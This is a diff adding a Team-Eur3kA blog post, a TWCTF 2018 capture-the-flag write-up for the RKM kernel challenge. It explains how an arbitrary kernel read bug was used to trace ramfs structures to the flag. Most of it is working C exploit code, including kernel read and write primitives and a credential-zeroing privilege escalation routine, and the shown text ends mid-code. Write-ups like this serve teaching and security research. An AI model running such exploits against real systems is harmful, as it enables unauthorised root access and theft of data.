@@ -1,0 +1,1315 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.46 with theme Tranquilpeak 0.4.3-BETA">
+    <title>TWCTF-2018 RKM (ReadableKernelModule) writeup</title>
+    <meta name="author" content="Team-Eur3kA">
+    <meta name="keywords" content="TWCTF, TWCTF-2018, writeup">
+
+    <link rel="icon" href="https://Team-Eur3kA.github.io/favicon.png">
+    
+
+    
+    <meta name="description" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="TWCTF-2018 RKM (ReadableKernelModule) writeup">
+    <meta property="og:url" content="/2018/09/twctf-2018-rkm-readablekernelmodule-writeup/">
+    <meta property="og:site_name" content="Team-Eur3kA Blog">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Team-Eur3kA Blog">
+    <meta name="twitter:description" content="">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif">
+    
+
+    
+      <meta property="og:image" content="https://avatars3.githubusercontent.com/u/5594144?s=400&v=4">
+    
+    
+      <meta property="og:image" content="//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg">
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Team-Eur3kA.github.io/css/style-jsjn0006wyhpyzivf6yceb31gvpjatbcs3qzjvlumobfnugccvobqwxnnaj8.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Team-Eur3kA.github.io/">Team-Eur3kA Blog</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Team-Eur3kA.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Team-Eur3kA.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Team-Eur3kA</h4>
+        
+          <h5 class="sidebar-profile-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Team-Eur3kA" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Team-Eur3kA.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      TWCTF-2018 RKM (ReadableKernelModule) writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2018-09-09T00:00:00Z">
+        
+  September 9, 2018
+
+      </time>
+    
+    
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/twctf">TWCTF</a>, 
+    
+      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/twctf-2018">TWCTF-2018</a>, 
+    
+      <a class="category-link" href="https://Team-Eur3kA.github.io/categories/writeup">writeup</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p></p>
+
+<h1 id="twctf-2018-rkm-readablekernelmodule-writeup">TWCTF 2018 RKM (ReadableKernelModule) Writeup</h1>
+
+<p>Thanks @Garyo for this great challenge which makes me understand about initramfs more than ever. :)</p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>This challenge is modified from previous <a href="https://github.com/mncoppola/StringIPC">CSAW 2015 kernel challenge</a> but without any write functionalities provided.</p>
+
+<p>Bug is the same, not changed. For more information, you can refer to writeups about the orriginal challenge, I&rsquo;m not gonna talk about the original challenge here.</p>
+
+<p>With the exact same bug, we can do arbitrary read access, but since no more write access provided, we cannot do any write.</p>
+
+<p>It firstly seems to be impossible to pwn without write, but since it is tagged as &ldquo;misc&rdquo; along with &ldquo;pwn&rdquo;, we may need to think about this a different way which may not give us root access but to read flag directly.</p>
+
+<h2 id="first-glance">First glance</h2>
+
+<p>Alright, so far so good, no write, just arbitrary read. But note that this whole thing, kernel along with its filesystem is <strong>ALL IN MEMORY</strong>. From the <code>run.sh</code> provided, we can see that:</p>
+
+<pre><code>qemu-system-x86_64 -kernel bzImage -m 64M -initrd rootfs.cpio -append &quot;root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr&quot; -nographic -monitor /dev/null -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap 2&gt;/dev/null
+</code></pre>
+
+<p>There is a parameter to the kernel saying &ldquo;root=/dev/ram&rdquo;, which asks the kernel to use ram as the disk. Since we now have arbitrary read, we can basically read anything as long as it is in ram, so we can definitely read the flag.</p>
+
+<p>So, I know some of the teams just did it by bruteforce the whole memory expansion and try to find out the flag by checking the signature &ldquo;TWCTF&rdquo;. The author thought the same way, but still, I thought this method is too slow to use. We firstly thought this is impossible since it may be TOO slow, however it works&hellip; So I failed to solve this challenge during the CTF. After it, I have enough time research on this, so I use another way.</p>
+
+<h2 id="ramfs">ramfs</h2>
+
+<p>Now, we know that flag must be in ram somewhere, but we know nothing about ramfs (at least I know nothing about it during CTF..).</p>
+
+<p>I searched some documentation, and it helped, like <a href="https://wiki.debian.org/ramf://wiki.debian.org/ramfs">like one</a>:</p>
+
+<blockquote>
+<p>Ramfs is a very simple FileSystem that exports Linux&rsquo;s disk cacheing mechanisms (the page cache and dentry cache) as a dynamically resizable ram-based filesystem.</p>
+
+<p>With ramfs, there is no backing store.</p>
+</blockquote>
+
+<p>So, I now know that this ramfs is using only caches without backing store, great. And it&rsquo;s a filesystem, fantastic.</p>
+
+<p>A linux filesystem must have some important structures, like <code>dentry</code> and <code>inode</code>, so our first job is clear. We need to find these metadata of the flag file before anything else.</p>
+
+<h2 id="long-way-of-searching">Long way of searching&hellip;</h2>
+
+<p>From now on, things are actually getting bored.. We first need to find out the path from some global variable to the <code>inode</code> at least.</p>
+
+<p>By doing searching and searching, I used <code>init_task</code> global variable as a start.</p>
+
+<p>Other process of finding &ldquo;flag&rdquo; file inode can be described like this:</p>
+
+<pre><code>init_task.fs (fs_struct) -&gt; 
+fs_struct.root (path) -&gt;
+path.dentry (dentry) -&gt;
+dentry.d_subdirs (list_head of dentry)
+// now search dentry.d_name, see which one is flag, since flag is under &quot;/&quot;
+--&gt; (search) --&gt; (after search, we get flag's dentry)
+dentry.d_inode (inode)
+</code></pre>
+
+<p>This process is quite clear, once you get the structure definition, it is easy to find the next field you should use. But I really hope things to be that simple..</p>
+
+<p>There is a mechanism called &ldquo;randomized layout&rdquo; within kernel. For example, the <code>dentry</code>:</p>
+
+<pre><code>struct dentry {
+	/* RCU lookup touched fields */
+	unsigned int d_flags;		/* protected by d_lock */
+	seqcount_t d_seq;		/* per dentry seqlock */
+	struct hlist_bl_node d_hash;	/* lookup hash list */
+	struct dentry *d_parent;	/* parent directory */
+	struct qstr d_name;
+	struct inode *d_inode;		/* Where the name belongs to - NULL is
+					 * negative */
+	unsigned char d_iname[DNAME_INLINE_LEN];	/* small names */
+
+	/* Ref lookup also touches following */
+	struct lockref d_lockref;	/* per-dentry lock and refcount */
+	const struct dentry_operations *d_op;
+	struct super_block *d_sb;	/* The root of the dentry tree */
+	unsigned long d_time;		/* used by d_revalidate */
+	void *d_fsdata;			/* fs-specific data */
+
+	union {
+		struct list_head d_lru;		/* LRU list */
+		wait_queue_head_t *d_wait;	/* in-lookup ones only */
+	};
+	struct list_head d_child;	/* child of parent list */
+	struct list_head d_subdirs;	/* our children */
+	/*
+	 * d_alias and d_rcu can share memory
+	 */
+	union {
+		struct hlist_node d_alias;	/* inode alias list */
+		struct hlist_bl_node d_in_lookup_hash;	/* only for in-lookup ones */
+	 	struct rcu_head d_rcu;
+	} d_u;
+} __randomize_layout; //  NOTE THIS!
+</code></pre>
+
+<p>The last line, we see a &ldquo;__randomize_layout&rdquo; there, which means this structure&rsquo;s field is randomized. So, we can&rsquo;t get the offset directly to access its field..</p>
+
+<p>Hopefully, we are not screwed. There are many places within kernel itself accessing field of such type, which leaves us opportunity to find out exact offset.</p>
+
+<p>Since I haven&rsquo;t recorded the whole process of finding all this offset, I&rsquo;ll use an example of finding <code>d_name</code> offset in <code>dentry</code> to illustrate this process.. (It is actually quite a long way to search through all this&hellip;)</p>
+
+<p>I grepped &ldquo;d_name&rdquo; within my kernel source, and find it in &ldquo;/fs/dcache.c&rdquo;, referenced by a function called <code>__d_alloc</code>. I picked this one, mostly because it uses `dentry-&gt;d_name.name&rdquo;. Its exactly what I need, and its exported, so we&rsquo;ll know where exactly it is.</p>
+
+<p><a href="https://elixir.bootlin.com/linux/v4.15-rc9/source/fs/dcache.c#L163://elixir.bootlin.com/linux/v4.15-rc9/source/fs/dcache.c#L1633">source</a></p>
+
+<pre><code class="language-c">    dentry-&gt;d_name.len = name-&gt;len;
+	dentry-&gt;d_name.hash = name-&gt;hash;
+	memcpy(dname, name-&gt;name, name-&gt;len);
+	dname[name-&gt;len] = 0;
+
+	/* Make sure we always see the terminating NUL character */
+	smp_wmb();
+	dentry-&gt;d_name.name = dname;
+</code></pre>
+
+<p>Then I opened the kernel in IDA, jump to this function. I wrote a <a href="https://github.com/Escapingbug/scripts/tree/master/linux/kernel/export_symbol">script</a> to rename these exported functions.</p>
+
+<p>After several analysis, I&rsquo;m sure the offsets are like this:</p>
+
+<pre><code>    *(_DWORD *)(v5 + 0x24) = v6;                // dname.len
+    *(_DWORD *)(v5 + 0x20) = v9;                // dname.hash
+    dname_ = (char *)memcpy(dname, v8, namelen);
+    dname_[namelen] = 0;
+    *(_QWORD *)(v5 + 0x28) = dname_; // dentry-&gt;d_name.name = dname
+</code></pre>
+
+<p>So, <code>dentry-&gt;d_name.len</code> is at <code>dentry + 0x24</code>, <code>dentry-&gt;d_name.hash</code> is at <code>dentry + 0x20</code> and <code>dentry-&gt;d_name.name</code> is at <code>dentry + 0x28</code>.</p>
+
+<p>Now I can do dynamic stuff, checking it out..</p>
+
+<p>For example, the root:</p>
+
+<pre><code>0xffff9ed702008000     00 00 21 00 02 00 00 00 00 00 00 00 00 00 00 00     ..!.............
+0xffff9ed702008010     00 00 00 00 00 00 00 00 00 80 00 02 d7 9e ff ff     ................
+0xffff9ed702008020     00 00 00 00 01 00 00 00 38 80 00 02 d7 9e ff ff     ........8....... // Here 0x24 ~ 0x28 is length, which is one
+// And 0x28 is the pointer to name, which points to 0x38
+0xffff9ed702008030     00 40 00 02 d7 9e ff ff 2f 00 bc 13 6a 9b d5 27     .@....../...j..' // Here 0x38 is told to be name, which is &quot;/&quot; here.
+</code></pre>
+
+<p>And behold! Here it is.</p>
+
+<p>This is just a simple illustration of what I did to get all the offset, and it is really a long way to go. Since many structures are randomized.</p>
+
+<p>Anyway, I got the inode. But where is the memory?</p>
+
+<h2 id="from-inode-to-memory-another-long-race">From inode to memory, another long race..</h2>
+
+<p>This is what made me stuck during CTF, or else I could solve this challenge.</p>
+
+<p>We now know how to get the inode, but memory address information is not in it. Checkout <code>inode</code> structure, I got this:</p>
+
+<pre><code>struct inode {
+	...
+	struct address_space    *i_mapping;
+	...
+} __randomize_layout;
+</code></pre>
+
+<p>My guess was that this field could tell me where the address is. And go on:</p>
+
+<pre><code>struct address_space {
+	struct inode		*host;		/* owner: inode, block_device */
+	struct radix_tree_root	page_tree;	/* radix tree of all pages */
+	spinlock_t		tree_lock;	/* and lock protecting it */
+	atomic_t		i_mmap_writable;/* count VM_SHARED mappings */
+	struct rb_root_cached	i_mmap;		/* tree of private and shared mappings */
+	struct rw_semaphore	i_mmap_rwsem;	/* protect tree, count, list */
+	/* Protected by tree_lock together with the radix tree */
+</code></pre>
+
+<p>There is a <code>page_tree</code>, which is a <code>radix_tree_root</code>. Since its name is page, I&rsquo;m looking forward to get a page struct out of it. But it is wrapped in <code>radix_tree_root</code>. Flag is not long, so there must be only one page within, it seemed quite easy at that time..</p>
+
+<p>Let&rsquo;s look at that <code>radix_tree_root</code> definition:</p>
+
+<pre><code>struct radix_tree_root {
+	gfp_t			gfp_mask;
+	struct radix_tree_node	__rcu *rnode;
+};
+
+struct radix_tree_node {
+	unsigned char	shift;		/* Bits remaining in each slot */
+	unsigned char	offset;		/* Slot offset in parent */
+	unsigned char	count;		/* Total entry count */
+	unsigned char	exceptional;	/* Exceptional entry count */
+	struct radix_tree_node *parent;		/* Used when ascending tree */
+	struct radix_tree_root *root;		/* The tree we belong to */
+	union {
+		struct list_head private_list;	/* For tree user */
+		struct rcu_head	rcu_head;	/* Used when freeing node */
+	};
+	void __rcu	*slots[RADIX_TREE_MAP_SIZE];
+	unsigned long	tags[RADIX_TREE_MAX_TAGS][RADIX_TREE_TAG_LONGS];
+};
+</code></pre>
+
+<p>No randomized layout, good. Then I dumped the node:</p>
+
+<pre><code>0xffffd94d000772c0     38 00 00 00 00 00 00 40 60 53 09 02 d7 9e ff ff     8......@`S......  
+0xffffd94d000772d0     00 00 00 00 00 00 00 00 ff ff ff ff 01 00 00 00     ................  
+0xffffd94d000772e0     a0 72 07 00 4d d9 ff ff 20 66 06 00 4d d9 ff ff     .r..M... f..M...  
+0xffffd94d000772f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ................  
+</code></pre>
+
+<p>What is that &ldquo;ff ff ff ff 01 00 00 00&rdquo;?? It should be that union, but both unions are two pointers, this value cannot be pointers.. So I am really confused of how to parse this thing&hellip;</p>
+
+<p>Good news that, till now I get get the <code>radix_tree_root</code>, then @Garyo told me that there is a function called &ldquo;find_get_entry&rdquo;. I checked it, the comments were very clear:</p>
+
+<pre><code>/**
+ * find_get_entry - find and get a page cache entry
+ * @mapping: the address_space to search
+ * @offset: the page cache index
+ *
+ * Looks up the page cache slot at @mapping &amp; @offset.  If there is a
+ * page cache page, it is returned with an increased refcount.
+ *
+ * If the slot holds a shadow entry of a previously evicted page, or a
+ * swap entry from shmem/tmpfs, it is returned.
+ *
+ * Otherwise, %NULL is returned.
+ */
+struct page *find_get_entry(struct address_space *mapping, pgoff_t offset)
+{
+</code></pre>
+
+<p>So, what I did is to setup a breakpoint there, like this:</p>
+
+<pre><code>break *[address of find_get_entry] if $rdi==[address of i_mapping I found]
+</code></pre>
+
+<p>Then I got it to break. And with gdb&rsquo;s help, I could trace through this function, and get the offset to real page struct offset, turn out to be just the address after <code>radix_tree_node-&gt;gfp_mask</code> within <code>radix_tree_root</code>&hellip; This was to say, what we got earlier, was not a <code>radix_tree_node</code>, but <code>struct page</code>&hellip;Ummmmm. That explains&hellip;</p>
+
+<p>Now we got the page struct, how to get the address? This was a little bit tricky, since while I was tracing through the <code>find_get_entry</code> function, I didn&rsquo;t stop after it returned, with my eyes staring on new addresses. Suddenly after some magic function at <code>0xffffffff81203ba0</code>(When base is <code>0xffffffff81000000</code>, my ida is not working properly, I can&rsquo;t rebase it), the returned value was new, and it pointted to flag content!</p>
+
+<p>Then I looked inside, got assembly like this:</p>
+
+<pre><code>// r8 is our input, which is the address of our page struct
+ .text:FFFFFFFF81203BC1                 mov     r10, cs:page_offset_base
+ .text:FFFFFFFF81203BC8                 lea     r9, [rdx-1]
+ .text:FFFFFFFF81203BCC                 and     edx, 1
+ .text:FFFFFFFF81203BCF                 lea     rdx, [rsi+r14]
+ .text:FFFFFFFF81203BD3                 cmovz   r9, rdi
+ .text:FFFFFFFF81203BD7                 mov     rdi, cs:vmemmap_base
+ .text:FFFFFFFF81203BDE                 sub     r8, rdi
+ .text:FFFFFFFF81203BE1                 sar     r8, 6
+ .text:FFFFFFFF81203BE5                 shl     r8, 0Ch
+ .text:FFFFFFFF81203BE9                 add     r8, r10
+</code></pre>
+
+<p>After this gadget, <code>r8</code> is the pointer to flag content.</p>
+
+<p>Then it was done, but I&rsquo;m gonna admit that I still don&rsquo;t know why this happens.</p>
+
+<h2 id="sum-up-exploit-process">Sum up exploit process</h2>
+
+<pre><code>init_task.fs (fs_struct) -&gt; 
+fs_struct.root (path) -&gt;
+path.dentry (dentry) -&gt;
+dentry.d_subdirs (list_head of dentry)
+
+// now search dentry.d_name, see which one is flag, since flag is under &quot;/&quot;
+--&gt; (search) --&gt; (after search, we get flag's dentry)
+
+dentry.d_inode (inode) -&gt;
+inode.i_mapping (address_space) -&gt;
+address_space.page_tree (radix_tree_root) -&gt;
+radix_tree_root.rnode (page) -&gt;
+
+// calculate the real address using global variable page_offset_base and vmemmap_base
+flag_addr -&gt; flag_content
+</code></pre>
+
+<h2 id="exploit">Exploit</h2>
+
+<pre><code>
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+
+#define CHECKED(_val, err) \
+  if (_val &lt; 0) { \
+    printf(err); \
+    printf(&quot; error\n&quot;); \
+    exit(-1); \
+  }
+
+#define PAGE_SIZE getpagesize()
+#define PAGE_OFFSET 0xffffffff81000000
+#define BUF_SIZE PAGE_SIZE
+
+#define TASK_COMM_LEN 16
+
+#define CSAW_IOCTL_BASE     0x77617363
+#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
+#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
+#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
+#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
+#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
+#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
+#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
+#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
+
+struct alloc_channel_args {
+    size_t buf_size;
+    int id;
+};
+
+struct open_channel_args {
+    int id;
+};
+
+struct grow_channel_args {
+    int id;
+    size_t size;
+};
+
+struct shrink_channel_args {
+    int id;
+    size_t size;
+};
+
+struct read_channel_args {
+    int id;
+    char *buf;
+    size_t count;
+};
+
+struct write_channel_args {
+    int id;
+    char *buf;
+    size_t count;
+};
+
+struct seek_channel_args {
+    int id;
+    loff_t index;
+    int whence;
+};
+
+struct close_channel_args {
+    int id;
+};
+
+void error ( char *msg )
+{
+    perror(msg);
+    exit(EXIT_FAILURE);
+}
+
+void hexdump ( char *addr, unsigned int length )
+{
+    unsigned int i, j;
+
+    for ( i = 0; i &lt; length / 16; i++ )
+    {
+        for ( j = 0; j &lt; 16; j++ )
+        {
+            printf(&quot;%02hhx &quot;, addr[i * 16 + j]);
+        }
+        printf(&quot;\n&quot;);
+    }
+}
+
+int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigned int size )
+{
+    int ret;
+    struct seek_channel_args seek_channel;
+    struct read_channel_args read_channel;
+
+    memset(&amp;seek_channel, 0, sizeof(seek_channel));
+    seek_channel.id = id;
+    seek_channel.index = kaddr - 0x10;
+    seek_channel.whence = SEEK_SET;
+
+    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);
+
+    memset(&amp;read_channel, 0, sizeof(read_channel));
+    read_channel.id = id;
+    read_channel.buf = buf;
+    read_channel.count = size;
+
+    ret = ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);
+
+    return ret;
+}
+
+int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
+{
+    int ret;
+    char null_byte = 0;
+    struct seek_channel_args seek_channel;
+    struct write_channel_args write_channel;
+
+    /*
+     * The write primitive uses strncpy_from_user(), so we can't write full
+     * dwords containing a null terminator. The exploit only needs to write
+     * zeroes anyhow, so this function just passes a single null byte.
+     */
+
+    memset(&amp;seek_channel, 0, sizeof(seek_channel));
+    seek_channel.id = id;
+    seek_channel.index = kaddr - 0x10;
+    seek_channel.whence = SEEK_SET;
+
+    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);
+
+    memset(&amp;write_channel, 0, sizeof(write_channel));
+    write_channel.id = id;
+    write_channel.buf = &amp;null_byte;
+    write_channel.count = sizeof(null_byte);
+
+    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);
+
+    return ret;
+}
+
+void escalate_creds ( int fd, int id, unsigned long cred_kaddr )
+{
+    unsigned int i;
+    unsigned long tmp_kaddr;
+
+    /*
+     * The cred struct looks like:
+     *
+     *     atomic_t    usage;
+     *     kuid_t      uid;
+     *     kgid_t      gid;
+     *     kuid_t      suid;
+     *     kgid_t      sgid;
+     *     kuid_t      euid;
+     *     kgid_t      egid;
+     *     kuid_t      fsuid;
+     *     kgid_t      fsgid;
+     *
+     * where each field is a 32-bit dword.  Skip the first field and write
+     * zeroes over the id fields to escalate to root.
+     */
+
+    /* Skip usage field */
+
+    tmp_kaddr = cred_kaddr + sizeof(int);
+
+    /* Now overwrite the id fields */
+
+    for ( i = 0; i &lt; (sizeof(int) * 8); i++ )
+        write_kernel_null_byte(fd, id, tmp_kaddr + i);
+}
+
+void gen_rand_str ( char *str, unsigned int len )
+{
+    unsigned int i;
+
+    for ( i = 0; i &lt; (len - 1); i++ )
+        str[i] = (rand() % (0x7e - 0x20)) + 0x20;
+
+    str[len - 1] = 0;
+}
+
+int main ( int argc, char **argv )
+{
+    int ret, fd, id;
+    unsigned long offset;
+    char *addr, *ceiling;
+    struct alloc_channel_args alloc_channel;
+    struct shrink_channel_args shrink_channel;
+    char comm[TASK_COMM_LEN];
+
+    /* Set comm to random signature */
+
+	/*
+    srand(time(NULL));
+
+    gen_rand_str(comm, sizeof(comm));
+
+    printf(&quot;Generated comm signature: '%s'\n&quot;, comm);
+
+    ret = prctl(PR_SET_NAME, comm);
+    if ( ret &lt; 0 )
+       error(&quot;prctl&quot;);
+	*/
+
+    /* Open device */
+
+    fd = open(&quot;/dev/csaw&quot;, O_RDONLY);
+    if ( fd &lt; 0 )
+        error(&quot;open&quot;);
+
+    /* Allocate IPC channel */
+
+    memset(&amp;alloc_channel, 0, sizeof(alloc_channel));
+    alloc_channel.buf_size = 1;
+
+    ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_channel);
+    if ( ret &lt; 0 )
+        error(&quot;ioctl&quot;);
+
+    id = alloc_channel.id;
+
+    printf(&quot;Allocated channel id %d\n&quot;, id);
+
+    /* Shrink channel to -1 */
+
+    memset(&amp;shrink_channel, 0, sizeof(shrink_channel));
+    shrink_channel.id = id;
+    shrink_channel.size = 2;
+
+    ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_channel);
+    if ( ret &lt; 0 )
+        error(&quot;ioctl&quot;);
+
+    printf(&quot;Shrank channel to -1 bytes\n&quot;);
+
+    /* Map buffer for leaking kernel memory to */
+
+    addr = (char *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+    if ( addr == MAP_FAILED )
+        error(&quot;mmap&quot;);
+
+    ceiling = addr + BUF_SIZE;
+
+    printf(&quot;Mapped buffer %p:0x%x\n&quot;, addr, BUF_SIZE);
+
+    printf(&quot;Scanning kernel memory for comm signature...\n&quot;);
+
+    /*
+     * We escalate to root by modifying our cred struct in memory.  We first
+     * find it by leaking kernel memory one chunk at a time and applying a
+     * simple heuristic.
+     *
+     * Pointers to our creds reside next to the user-controllable comm field in
+     * task_struct:
+     *
+     *     const struct cred __rcu *real_cred;
+     *     const struct cred __rcu *cred;
+     *     char comm[TASK_COMM_LEN];
+     *
+     * Scan memory for our unique comm string, then verify that the two prior
+     * qwords look like kernel pointers.
+     */
+
+    offset = 0;
+
+    /* Anciety starts RKM exploit from here ! */
+
+    unsigned long kernel_addr = 0x0;
+    char *ptr;
+    unsigned long t_addr;
+
+    /*
+     * Found offset 
+     * (may not be useful, debug it to make sure it is right, since the format is
+     * messy about pointers and pointers to pointers..)
+     * (If you only want exact offsets, see exploit process below.. Not this one)
+     *
+     * init_task @ kernel_addr + 0xc10480
+     * fs @ init_task + 0x568
+     * root dentry @ fs + 0x30
+     * entry name @ dentry + 0x20(0x24?)
+     * entry name string @ *(entry name + 0x8(0x4?))
+     * subdirs @ dentry + 0xa0
+     * dentry payload = subdirs @ subdirs - 0x90
+     * subdirs next @ *subdirs
+     * subdirs prev @ *(subdirs + 8)
+     * inode @ dentry + 0x30
+     * inode-&gt;i_mapping @ inode + 48
+     * inode-&gt;i_data @ inode + 352
+     * inode-&gt;i_data.nrpages @ inode + 440
+     * address_space-&gt;i_mmap @ address_space + 32
+     * page-&gt;mapping @ page + 8
+     * address_space-&gt;radix_tree_root @ address_space + 0
+     * radix_tree_root-&gt;gfp_mask @ radix_tree_root + 8
+     * radix_tree_root-&gt;rnode @ radix_tree_root + 16
+     */
+
+    /* searching for kernel base */
+    while (1) {
+    	kernel_addr = PAGE_OFFSET + offset;
+
+    	ret = read_kernel_memory(fd, id, kernel_addr, addr, BUF_SIZE);
+    
+    	if ( ret &lt; 0 )
+    	{
+        	offset += 0x100000;
+        	continue;
+    	}
+    	
+    	printf(&quot;kernel_addr: %lx\n&quot;, (unsigned long)kernel_addr);
+    	//hexdump(addr, BUF_SIZE);
+        break;
+    }
+
+    /* long way to get to flag starts.. */
+ 
+    unsigned long init_task_addr = kernel_addr + 0xc10480;
+
+    unsigned long fs_addr = 0;
+    ret = read_kernel_memory(fd, id, init_task_addr + 0x568, &amp;fs_addr, 8);
+    CHECKED(ret, &quot;read fs&quot;);
+    printf(&quot;fs @ 0x%lx\n&quot;, fs_addr);
+
+    unsigned long root_dentry_addr = 0;
+    ret = read_kernel_memory(fd, id, fs_addr + 0x30, &amp;root_dentry_addr, 8);
+    CHECKED(ret, &quot;read root_dentry&quot;);
+    printf(&quot;root_dentry @ 0x%lx\n&quot;, root_dentry_addr);
+
+    /* we now have the root dentry, iterate through its subdirs, see where is the flag dentry */
+    unsigned long root_subdirs = 0;
+    ret = read_kernel_memory(fd, id, root_dentry_addr + 0xa0, &amp;root_subdirs, 8);
+    CHECKED(ret, &quot;read root subdirs&quot;);
